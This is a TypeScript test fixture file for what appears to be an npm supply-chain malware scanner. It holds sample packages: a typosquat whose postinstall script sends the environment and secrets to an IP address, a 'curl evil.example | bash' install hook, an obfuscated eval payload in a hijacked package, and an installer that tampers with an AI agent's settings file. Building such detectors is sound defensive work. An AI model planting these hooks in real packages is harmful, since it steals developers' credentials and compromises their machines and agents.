import type { PackageMeta, TarballFile } from "../src/types.js";

function file(path: string, content: string): TarballFile {
  return { path, size: Buffer.byteLength(content), content, binary: false };
}

export interface Fixture {
  meta: PackageMeta;
  current: TarballFile[];
  previous?: TarballFile[];
}

export const typosquatWithPayload: Fixture = {
  meta: {
    name: "is0dd",
    version: "1.0.3",
    versions: ["1.0.3"],
    publishedAt: new Date(Date.now() - 6 * 3600_000).toISOString(),
    ageDays: 0.25,
    maintainers: ["totally-legit"],
    weeklyDownloads: 41,
    deprecated: false,
    scripts: { postinstall: "node ./setup.js" },
  },
  current: [
    file(
      "package.json",
      JSON.stringify({
        name: "is0dd",
        version: "1.0.3",
        scripts: { postinstall: "node ./setup.js" },
      }),
    ),
    file(
      "setup.js",
      [
        "const https = require('https');",
        "const token = process.env.NPM_TOKEN || process.env.AWS_SECRET_ACCESS_KEY;",
        "const req = https.request('http://185.234.72.19/collect', { method: 'POST' });",
        "req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'));",
        "req.end();",
      ].join("\n"),
    ),
    file("index.js", "module.exports = n => n % 2 === 1;"),
  ],
};

export const curlPipePayload: Fixture = {
  meta: {
    name: "leftpad-utils",
    version: "0.0.1",
    versions: ["0.0.1"],
    publishedAt: new Date(Date.now() - 3600_000).toISOString(),
    ageDays: 0.04,
    maintainers: ["new-guy"],
    weeklyDownloads: 3,
    deprecated: false,
    scripts: { postinstall: "curl -s http://evil.example/i.sh | bash" },
  },
  current: [
    file(
      "package.json",
      JSON.stringify({
        name: "leftpad-utils",
        version: "0.0.1",
        scripts: { postinstall: "curl -s http://evil.example/i.sh | bash" },
      }),
    ),
    file("index.js", "module.exports = {};"),
  ],
};

export const hijackedPackage: Fixture = {
  meta: {
    name: "color-parser",
    version: "3.4.1",
    versions: Array.from({ length: 40 }, (_, i) => `3.${i}.0`).concat("3.4.1"),
    previousVersion: "3.4.0",
    publishedAt: new Date(Date.now() - 2 * 3600_000).toISOString(),
    ageDays: 0.08,
    maintainers: ["attacker-account"],
    previousMaintainers: ["original-author"],
    weeklyDownloads: 5_000_000,
    deprecated: false,
    scripts: { postinstall: "node ./dist/b.js", build: "tsc" },
    previousScripts: { build: "tsc" },
  },
  current: [
    file(
      "package.json",
      JSON.stringify({
        name: "color-parser",
        version: "3.4.1",
        scripts: { postinstall: "node ./dist/b.js", build: "tsc" },
      }),
    ),
    file(
      "dist/b.js",
      "var _0x1a2b=" +
        JSON.stringify("a".repeat(50)) +
        ";eval(Buffer.from('" +
        "aGVsbG8gd29ybGQ".repeat(30) +
        "','base64').toString());var x=" +
        '"\\x68\\x74\\x74\\x70".repeat ? "" : "";'.padEnd(20, " ") +
        "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x31\\x30\\x2e\\x30\\x2e\\x30\\x2e\\x31".repeat(
          3,
        ),
    ),
    file("index.js", "module.exports = require('./dist/b.js');"),
  ],
  previous: [
    file(
      "package.json",
      JSON.stringify({
        name: "color-parser",
        version: "3.4.0",
        scripts: { build: "tsc" },
      }),
    ),
    file("index.js", "module.exports = function parse(s){ return s; };"),
  ],
};

export const cleanNewPackage: Fixture = {
  meta: {
    name: "tiny-slugify",
    version: "1.0.0",
    versions: ["1.0.0"],
    publishedAt: new Date(Date.now() - 3600_000).toISOString(),
    ageDays: 0.04,
    maintainers: ["some-dev"],
    weeklyDownloads: 12,
    deprecated: false,
    scripts: {},
  },
  current: [
    file("package.json", JSON.stringify({ name: "tiny-slugify", version: "1.0.0" })),
    file("index.js", "export const slugify = s => s.toLowerCase().replace(/\\s+/g, '-');"),
    file("README.md", "# tiny-slugify\n\nMakes slugs."),
  ],
};

export const cleanEstablishedPackage: Fixture = {
  meta: {
    name: "date-helpers",
    version: "5.2.0",
    versions: Array.from({ length: 30 }, (_, i) => `5.${i}.0`),
    previousVersion: "5.1.0",
    publishedAt: new Date(Date.now() - 60 * 86400_000).toISOString(),
    ageDays: 60,
    maintainers: ["trusted-maintainer"],
    previousMaintainers: ["trusted-maintainer"],
    weeklyDownloads: 3_000_000,
    deprecated: false,
    scripts: { build: "tsc", test: "vitest" },
    previousScripts: { build: "tsc", test: "vitest" },
  },
  current: [
    file(
      "package.json",
      JSON.stringify({
        name: "date-helpers",
        version: "5.2.0",
        scripts: { build: "tsc", test: "vitest" },
      }),
    ),
    file("index.js", "export const now = () => new Date();"),
  ],
  previous: [
    file(
      "package.json",
      JSON.stringify({
        name: "date-helpers",
        version: "5.1.0",
        scripts: { build: "tsc", test: "vitest" },
      }),
    ),
    file("index.js", "export const now = () => new Date();"),
  ],
};

export const agentConfigWriter: Fixture = {
  meta: {
    name: "helpful-setup",
    version: "1.0.0",
    versions: ["1.0.0"],
    publishedAt: new Date(Date.now() - 3600_000).toISOString(),
    ageDays: 0.04,
    maintainers: ["new-guy"],
    weeklyDownloads: 8,
    deprecated: false,
    scripts: { postinstall: "node ./install.js" },
  },
  current: [
    file(
      "package.json",
      JSON.stringify({
        name: "helpful-setup",
        version: "1.0.0",
        scripts: { postinstall: "node ./install.js" },
      }),
    ),
    file(
      "install.js",
      [
        "const fs = require('fs');",
        "fs.appendFileSync(process.env.HOME + '/.claude/settings.json', payload);",
      ].join("\n"),
    ),
    file(".claude/settings.json", '{"hooks":{}}'),
  ],
};
